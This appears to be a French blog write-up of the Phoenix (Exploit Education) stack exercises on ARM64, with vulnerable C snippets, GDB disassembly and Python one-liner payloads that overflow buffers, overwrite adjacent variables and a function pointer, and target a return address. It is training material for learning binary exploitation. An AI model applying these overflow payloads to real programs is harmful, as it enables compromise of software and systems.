---
title: Exploitation de vulnérabilités binaires avec Phoenix
date: 2026-01-25
categories: [Security, Reverse, Pentest]
tags: [pentest, exploit, buffer-overflow, reverse, gdb, binary]
---

# Exploitation de vulnérabilités binaires avec Phoenix

Dans le cadre de mon apprentissage en sécurité offensive, je me suis exercé sur la VM [Phoenix d'Exploit Education](https://exploit.education/), une plateforme dédiée à l'apprentissage de l'exploitation de vulnérabilités binaires. Mon objectif était de travailler la recherche de vulnérabilités, en me concentrant principalement sur les buffer overflows, heap overflows et format strings.

## Pourquoi Phoenix ?

Phoenix propose une série d'exercices progressifs permettant de comprendre en profondeur le fonctionnement de la mémoire et les mécanismes d'exploitation. J'ai pu pratiquer :
- **Buffer overflow** : débordement de tampon pour écraser des variables adjacentes
- **Accès à des fonctions non prévues** : détournement du flux d'exécution
- **Shellcode** : injection et exécution de code arbitraire
- **Utilisation de GDB** : analyse et débogage de binaires

Ces compétences sont essentielles pour le reverse engineering et la recherche de vulnérabilités dans des programmes compilés.

## Environnement de travail

Après avoir téléchargé et installé la VM Phoenix (architecture ARM64), le répertoire de travail `/opt/phoenix/arm64/` contient plusieurs catégories d'exercices :

```
stack-zero     stack-one      stack-two      stack-three
stack-four     stack-five     stack-six
format-zero    format-one     format-two     format-three    format-four
heap-zero      heap-one       heap-two       heap-three
net-zero       net-one        net-two
final-zero     final-one      final-two
```

Je vais détailler ma démarche sur les exercices de la catégorie **stack**, qui exploitent des vulnérabilités de buffer overflow.

---

## Stack-Zero : Premier débordement

### Analyse du code source

Le premier exercice présente une structure locale contenant un buffer de 64 octets et une variable `changeme` :

```c
struct {
    char buffer[64];
    volatile int changeme;
} locals;

locals.changeme = 0;
gets(locals.buffer);

if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
}
```

### Identification de la vulnérabilité

La vulnérabilité se trouve dans l'utilisation de `gets(locals.buffer)`, une fonction dangereuse qui **ne vérifie pas la taille du buffer**. Si nous écrivons plus de 64 octets, nous débordons sur la mémoire adjacente.

### Représentation mémoire

![](/images/phoenux/stack-zero.png)

La structure étant stockée de manière contiguë en mémoire, écrire au-delà de `buffer[64]` écrase directement la variable `changeme`.

### Exploitation

Pour modifier `changeme`, il suffit d'envoyer 65 caractères (ou plus) :

```bash
python2 -c "print(65 * 'a')" | ./stack-zero
```

**Résultat** : La variable `changeme` est modifiée, le challenge est validé.

---

## Stack-One : Contrôle précis de la valeur

### Évolution du challenge

Cette fois, il ne suffit pas de modifier `changeme`, il faut lui donner la valeur **exacte** `0x496c5962` :

```c
strcpy(locals.buffer, argv[1]);

if (locals.changeme == 0x496c5962) {
    puts("Well done, you have successfully set changeme to the correct value");
}
```

### Vulnérabilité

La fonction `strcpy()` ne vérifie pas la taille de la destination, permettant le même type de débordement.

### Représentation mémoire

![](/images/phoenux/stack-one.png)

### Considération de l'endianness

Les processeurs ARM utilisent le **little-endian** : les octets sont stockés dans l'ordre inverse. La valeur `0x496c5962` doit donc être écrite `\x62\x59\x6C\x49`.

### Exploitation

```bash
./stack-one $(python2 -c "print(64 * 'a' + '\x62\x59\x6C\x49')")
```

**Résultat** : `changeme` contient maintenant exactement `0x496c5962`.

---

## Stack-Two : Variables d'environnement

### Nouveau vecteur d'attaque

Le programme récupère la valeur depuis une variable d'environnement :

```c
ptr = getenv("ExploitEducation");
strcpy(locals.buffer, ptr);

if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
}
```

### Démarche d'exploitation

Même principe que précédemment, mais via une variable d'environnement :

```bash
export ExploitEducation=$(python2 -c "print(64 * 'a' + '\x0a\x09\x0a\x0d')")
./stack-two
```

**Résultat** : Validation du challenge en exploitant une source d'entrée différente.

---

## Stack-Three : Détournement de pointeur de fonction

### Objectif du challenge

Faire exécuter la fonction `complete_level()` en modifiant un pointeur de fonction :

```c
struct {
    char buffer[64];
    volatile int (*fp)();
} locals;

locals.fp = NULL;
gets(locals.buffer);

if (locals.fp) {
    locals.fp();  // Appel du pointeur de fonction
}
```

### Démarche de réflexion

Pour réussir, je dois :
1. Trouver l'adresse de `complete_level()` en mémoire
2. Écraser le pointeur `fp` avec cette adresse

### Analyse avec GDB

La VM Phoenix a l'**ASLR désactivé**, ce qui signifie que les adresses sont fixes. L'ASLR (Address Space Layout Randomization) est une protection introduite en 2005 sur Linux qui randomise les adresses mémoire.

```bash
gdb ./stack-three
(gdb) print complete_level
$1 = {<text variable, no debug info>} 0x4007c4 <complete_level>
```

### Exploitation

```bash
python2 -c "print(64 * 'a' + '\xc4\x07\x40')" | ./stack-three
```

**Résultat** : Le pointeur de fonction est redirigé vers `complete_level()`, qui s'exécute.

---

## Stack-Four : Modification de l'adresse de retour

### Nouveau mécanisme d'exploitation

Cette fois, l'objectif est d'exécuter `complete_level()` en modifiant **l'adresse de retour** de la fonction `start_level()` :

```c
void start_level() {
    char buffer[64];
    void *ret;

    gets(buffer);
    
    ret = __builtin_return_address(0);
    printf("and will be returning to %p\n", ret);
}
```

### Comprendre l'adresse de retour

Lorsqu'une fonction est appelée :
1. Le **prologue** sauvegarde l'adresse de retour sur la pile
2. À la fin, le **epilogue** restaure cette adresse pour retourner à l'appelant

En débordant le buffer, nous pouvons **écraser cette adresse de retour** et rediriger l'exécution.

### Analyse assembleur avec GDB

```bash
gdb ./stack-four
(gdb) disassemble start_level
```

```asm
Dump of assembler code for function start_level:
   0x0000000000400730 <+0>:   stp   x29, x30, [sp, #-112]!
   0x0000000000400734 <+4>:   mov   x29, sp
   0x0000000000400738 <+8>:   str   x19, [sp, #16]
   0x000000000040073c <+12>:  mov   x19, x30
   0x0000000000400740 <+16>:  add   x0, x29, #0x28
   0x0000000000400744 <+20>:  bl    0x400580 <gets@plt>
   0x0000000000400748 <+24>:  str   x19, [x29, #104]
   0x000000000040074c <+28>:  adrp  x0, 0x400000
   0x0000000000400750 <+32>:  add   x0, x0, #0x820
   0x0000000000400754 <+36>:  ldr   x1, [x29, #104]
   0x0000000000400758 <+40>:  bl    0x400570 <printf@plt>
   0x000000000040075c <+44>:  nop
   0x0000000000400760 <+48>:  ldr   x19, [sp, #16]
   0x0000000000400764 <+52>:  ldp   x29, x30, [sp], #112
   0x0000000000400768 <+56>:  ret
```

### Points clés de l'analyse

- **Ligne `<+0>`** : `stp x29, x30, [sp, #-112]!` — Sauvegarde du frame pointer (x29) et de l'adresse de retour (x30) sur la pile
- **Ligne `<+16>`** : `add x0, x29, #0x28` — Le buffer commence à `x29 + 0x28` (40 en décimal)
- **Ligne `<+52>`** : `ldp x29, x30, [sp], #112` — Restauration de x29 et x30 avant le retour

L'adresse de retour est stockée à 112 octets du début de la pile allouée. En calculant l'offset depuis le buffer, je peux déterminer précisément où écrire.

### Exploitation

Une fois l'adresse de `complete_level()` récupérée avec GDB et l'offset calculé, l'exploitation suit le même principe que pour stack-three.

---

## Conclusion et perspectives

Ce travail sur Phoenix m'a permis de :
- **Comprendre en profondeur** la gestion de la mémoire en architecture ARM64
- **Maîtriser GDB** pour l'analyse de binaires et le débogage
- **Développer une méthodologie** d'identification et d'exploitation de vulnérabilités
- **Renforcer mes compétences** en reverse engineering

Les exercices suivants (stack-five, stack-six, format strings, heap exploitation) sont actuellement en cour de rédaction.

